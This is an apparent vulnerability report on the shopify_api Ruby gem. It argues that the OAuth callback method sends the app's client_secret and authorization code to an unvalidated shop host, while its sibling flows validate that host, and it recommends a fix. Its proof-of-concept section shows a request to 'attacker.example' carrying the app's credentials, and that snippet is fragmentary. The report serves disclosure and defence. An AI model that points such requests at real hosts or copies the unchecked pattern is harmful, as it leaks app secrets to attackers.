### Title
`Auth::Oauth.validate_auth_callback` sends `client_secret` and authorization `code` to an unvalidated `shop` host - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the access-token exchange request using `auth_query.shop` directly, without ever passing it through `Utils::ShopValidator.sanitize!` the way every other OAuth-completion code path in this gem does. This breaks the intended binding "host that receives the app's `client_secret`" == "a domain proven to be a genuine Shopify property (`myshopify.com` / `myshopify.io` / `shopify.com` / `spin.dev` / `shop.dev`)".

### Finding Description
In `lib/shopify_api/auth/oauth.rb`: [1](#0-0) 

`validate_auth_callback` only checks:
1. `Utils::HmacValidator.validate(auth_query)` — proves the query (code/host/shop/state/timestamp) was signed with `Context.api_secret_key`.
2. The `state` cookie matches `auth_query.state`.

It then does:
```ruby
null_session = Auth::Session.new(shop: auth_query.shop)
body = { client_id: Context.api_key, client_secret: Context.api_secret_key, code: auth_query.code, ... }
client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
```

`Clients::HttpClient#initialize` builds the request host directly from `session.shop` when `Context.api_host` is not configured: [2](#0-1) 

So the POST containing the app's `client_id`, `client_secret`, and the OAuth `code` is sent to `https://#{auth_query.shop}/admin/oauth/access_token` — with `auth_query.shop` used verbatim.

Compare this to the sibling flows that perform the *same* kind of request (also sending `client_secret` to a `shop`-derived host), all of which sanitize the shop first:
- `ClientCredentials.client_credentials`: `validated_shop = Utils::ShopValidator.sanitize!(shop)` [3](#0-2) 
- `RefreshToken.refresh_access_token`: `validated_shop = Utils::ShopValidator.sanitize!(shop)` [4](#0-3) 
- `TokenExchange.migrate_to_expiring_token`: `validated_shop = Utils::ShopValidator.sanitize!(shop)` [5](#0-4) 

`ShopValidator.sanitize!` restricts the shop to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) or an explicitly configured `myshopify_domain`, and raises `Errors::InvalidShopError` otherwise: [6](#0-5) 

`validate_auth_callback` — the authorization-code-grant completion path, which is the oldest and most widely used OAuth completion method in the gem — is missing this same guard. `AuthQuery#to_signable_string` proves only that the `shop` value was HMAC-signed by whoever holds `Context.api_secret_key`; it does not prove the value is restricted to a genuine Shopify-owned domain. The HMAC check and the domain-trust check are two independent properties, and this method only implements the first one while its sibling methods implement both. The equality that should hold — "host that will receive `client_secret`" == "a domain in `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`" — is not enforced here.

### Impact Explanation
If an OAuth callback query can be produced/replayed with a `shop` value pointing at a non-Shopify host (any value accepted by the surrounding HMAC check), `validate_auth_callback` will POST the app's `client_id`, `client_secret`, and the authorization `code` to that attacker-influenced host. This is SSRF carrying the app's credentials (`client_secret` and authorization code) exactly matching the High-severity category in scope ("SSRF with the app's credentials"). Successful exploitation would leak the app's `client_secret` (and a live authorization `code`) to a third-party host, which is a Critical-level credential exfiltration outcome for the app.

### Likelihood Explanation
This is a structural, code-level gap rather than a purely theoretical one: the same class of request (POST with `client_secret` to a shop-derived host) is treated with a validated shop everywhere else in the library (`client_credentials.rb`, `refresh_token.rb`, `token_exchange.rb`'s `migrate_to_expiring_token`), showing the maintainers recognize `shop` must be constrained to trusted domains before it is used to construct a credential-carrying request host — yet `validate_auth_callback`, the primary authorization-code-grant completion method most non-embedded/legacy apps rely on, was not updated with the same check. I could not fully verify, given index limits, whether Shopify's authorize server can in practice be made to echo back a non-`myshopify.com` `shop` value in a validly HMAC-signed callback (that determination requires knowledge of Shopify's server-side OAuth implementation, which is outside this repository), so I present this as a concrete internal inconsistency/gap in this gem's own defense-in-depth rather than a fully proven exploit chain.

### Recommendation
In `lib/shopify_api/auth/oauth.rb`, sanitize `auth_query.shop` with `Utils::ShopValidator.sanitize!(auth_query.shop)` (consistent with `client_credentials.rb`, `refresh_token.rb`, and `token_exchange.rb`) before constructing `null_session` and before using the value to build `Session.from(shop: ...)`, raising `Errors::InvalidShopError` for any value outside `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
Not fully reproducible from the gem alone: exploitation depends on being able to obtain (or have Shopify emit) a validly-HMAC-signed OAuth callback whose `shop` field is not a `*.myshopify.com`/trusted domain — a server-side behavior of Shopify's OAuth authorize endpoint that is outside this repository's code and that I could not verify with the tools available. Within this codebase, the reachable root cause is demonstrable purely by code inspection:

```ruby

  code: "code", shop: "attacker.example", timestamp: "...", state: "...", host: "...",

)

# => Clients::HttpClient built with session.shop == "attacker.example"
# => POST https://attacker.example/admin/oauth/access_token
#      body: { client_id, client_secret: Context.api_secret_key, code, expiring }

        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))

      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
